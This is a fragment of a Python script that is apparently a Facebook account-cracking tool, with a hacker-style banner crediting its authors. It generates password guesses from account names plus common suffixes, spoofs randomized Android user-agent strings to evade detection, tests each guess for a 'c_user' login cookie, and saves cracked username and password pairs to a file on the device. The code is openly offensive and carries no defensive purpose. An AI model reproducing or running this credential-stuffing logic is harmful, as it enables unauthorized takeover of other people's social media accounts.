...
def buat_data(akun):
	...
	pwx, tampung = [], []
	belakang = ["123","1234","12345","123456","01","02"]
...
def ua_rozh():
	rr = random.randint; rc = random.choice; andro = rr(4,14)
	build = "Build/{}.{}.0{}".format(rc(['CLT-L29C','CLT-L29','CLT-L09C','CLT-L09','CLT-AL00','CLT-AL01','CLT-TL01','CLT-AL00L','CLT-L04','HW-01K','CLT-L0J']), rr(111111,333333), rr(10,20))
	chrome = "{}.0.{}.{}".format(rr(100,123), rr(1111,6500), rr(100,400))
	return f"Mozilla/5.0 (Linux; Android {andro}; {rc(list_ua)} {build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36"
...
|    ___|   {H}__{P} <       | update by BrutalX05
|___|   |______/{H}_______{P}| SC by {H}rozbasxyz{P}''')
	...
	for pw in password:
		try:
			...
			if "c_user" in str(babas):
				...
				if user not in hasil_akun: hasil_akun.append(user); print(f"\r[{H}!{P}] {M}{user}{P}|{M}{pw}{P}             "); cp += 1; open("/sdcard/FBL CP/CP-"+hari_save, "a").write(f"{user}|{pw}\n"); break
